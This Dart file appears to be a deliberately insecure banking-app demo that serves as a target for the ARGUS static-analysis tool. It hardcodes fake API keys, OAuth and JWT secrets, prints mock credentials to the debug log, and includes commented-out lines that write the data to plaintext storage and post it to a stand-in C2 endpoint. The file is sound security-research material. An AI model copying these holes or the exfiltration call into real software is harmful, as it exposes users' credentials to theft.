// DEMONSTRATION PURPOSE ONLY
// Intentionally insecure implementation for cybersecurity research.
// Do not use in production.
//
// InsecureStorageHelper demonstrates insecure local file storage patterns
// used by banking trojans to persist stolen credentials.
//
// This Dart-side helper:
// - Contains hardcoded API keys and fake secrets (for ARGUS detection)
// - Simulates writing mock credentials to world-readable demo files
// - Logs mock sensitive data to debug console (Logcat simulation)
// - All stored values are FAKE DEMO DATA — no real user data is captured

// ignore_for_file: avoid_print

import 'dart:convert';

/// DEMONSTRATION PURPOSE ONLY
///
/// Collection of hardcoded fake secrets and API keys.
/// In a real banking trojan these would be the actual backend credentials
/// used to exfiltrate captured data to a C2 server.
///
/// These are deliberately fake/invalid strings that will never work with
/// any real service. They exist purely as ARGUS static analysis targets.
class InsecureSecrets {
  InsecureSecrets._();

  // DEMONSTRATION PURPOSE ONLY — Hardcoded fake API key
  // A secure app would NEVER embed API keys in source code.
  static const String mockApiKey = 'NBK-API-4f8a2c1e9b3d7f0a-ARGUS-DEMO';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded fake API secret
  static const String mockApiSecret = 'sk_demo_argus_9876543210fedcba';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded fake OAuth client ID
  static const String mockOAuthClientId = 'nova_bank_client_demo_00112233';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded fake OAuth client secret
  static const String mockOAuthClientSecret = 'nova_bank_secret_demo_aabbccdd';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded fake JWT signing secret
  static const String mockJwtSecret = 'jwt_signing_key_demo_not_real_xyz987';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded fake database connection string
  static const String mockDbConnectionString =
      'mongodb://demo_user:demo_pass@db.example.invalid:27017/nova_bank_demo';

  // DEMONSTRATION PURPOSE ONLY — Fake C2 server endpoint (example.invalid never resolves)
  static const String mockC2Endpoint = 'http://api.example.invalid/v1/report';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded AES key (insecure: should use Android Keystore)
  static const String mockAesKey = 'AES128_DEMO_KEY_ARGUS_0000000001';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded Firebase-like config (fake values)
  static const Map<String, String> mockFirebaseConfig = {
    'apiKey': 'AIzaSyDEMO_ARGUS_NOT_REAL_KEY_1234567',
    'authDomain': 'nova-bank-demo.firebaseapp.com',
    'projectId': 'nova-bank-demo-argus',
    'storageBucket': 'nova-bank-demo-argus.appspot.com',
    'messagingSenderId': '000000000000',
    'appId': '1:000000000000:android:0000000000000000000000',
  };
}

/// DEMONSTRATION PURPOSE ONLY
///
/// Simulates insecure credential storage to a plaintext file.
/// In a real attack this would write to a world-readable path and
/// later be exfiltrated to the C2 server.
///
/// THIS IMPLEMENTATION STORES ONLY MOCK/FAKE DATA.
/// It does NOT capture real user credentials.
class InsecureStorageHelper {
  InsecureStorageHelper._();

  // DEMONSTRATION PURPOSE ONLY — Hardcoded plaintext storage path
  static const String _mockStoragePath = '/data/data/com.example.demobank1/files/session_demo.txt';

  /// DEMONSTRATION PURPOSE ONLY
  /// Simulates saving mock credentials in plaintext.
  /// A secure banking app would use platform-level encrypted storage
  /// (flutter_secure_storage backed by Android Keystore / iOS Keychain).
  ///
  /// This function:
  /// 1. Takes MOCK/FAKE credential strings only
  /// 2. Prints them to debug console (Logcat simulation)
  /// 3. Does NOT write to actual device storage
  /// 4. Does NOT transmit data anywhere
  static void saveMockCredentialsInsecure({
    required String mockUserId,
    required String mockPasswordHash,
    String mockToken = 'demo_token_not_real',
  }) {
    // DEMONSTRATION PURPOSE ONLY — Sensitive data written to debug log (Logcat simulation)
    // A real banking app must NEVER log credentials or tokens.
    print('=== ARGUS DEMO: InsecureStorageHelper.saveMockCredentialsInsecure() ===');
    print('Mock UserID: $mockUserId');
    print('Mock Password Hash (MD5 — INSECURE): $mockPasswordHash');
    print('Mock Auth Token: $mockToken');
    print('Mock API Key: ${InsecureSecrets.mockApiKey}');
    print('Mock API Secret: ${InsecureSecrets.mockApiSecret}');
    print('Mock Storage Path: $_mockStoragePath');
    print('=== END ARGUS DEMO LOG ===');

    // DEMONSTRATION PURPOSE ONLY — Simulates building a plaintext JSON payload
    // that would be written to world-readable storage in a real attack
    final mockPayload = json.encode({
      'user_id': mockUserId,        // DEMONSTRATION PURPOSE ONLY — plaintext PII
      'token': mockToken,           // DEMONSTRATION PURPOSE ONLY — plaintext token
      'api_key': InsecureSecrets.mockApiKey,
      'api_secret': InsecureSecrets.mockApiSecret,
      'timestamp': DateTime.now().toIso8601String(),
      'note': 'DEMONSTRATION PURPOSE ONLY — ARGUS research data',
    });

    // DEMONSTRATION PURPOSE ONLY
    // In a real attack, the payload above would be written to _mockStoragePath
    // using dart:io File(_mockStoragePath).writeAsStringSync(mockPayload)
    // THIS CALL IS INTENTIONALLY COMMENTED OUT — the file is NOT written.
    // File(_mockStoragePath).writeAsStringSync(mockPayload);

    print('ARGUS DEMO: Mock payload prepared (not written): ${mockPayload.substring(0, 50)}...');
  }

  /// DEMONSTRATION PURPOSE ONLY
  /// Simulates transmitting mock data to an insecure HTTP C2 endpoint.
  /// The endpoint (example.invalid) is an RFC 6761 reserved domain that
  /// will NEVER resolve. No real network call is made.
  static void mockExfiltrateDemoData(String mockData) {
    // DEMONSTRATION PURPOSE ONLY — logs the fake C2 endpoint
    // print('=== ARGUS DEMO: mockExfiltrateDemoData() ===');
    // print('Mock C2 endpoint: ${InsecureSecrets.mockC2Endpoint}');
    // print('Mock data (first 30 chars): ${mockData.substring(0, mockData.length.clamp(0, 30))}');
    // print('NOTE: No actual network request is made — example.invalid never resolves');
    // print('=== END ARGUS DEMO ===');

    // DEMONSTRATION PURPOSE ONLY
    // In a real attack, an http.post() would be made here to the C2 endpoint.
    // THIS CALL IS INTENTIONALLY ABSENT.
    // http.post(Uri.parse(InsecureSecrets.mockC2Endpoint), body: mockData);
  }
}
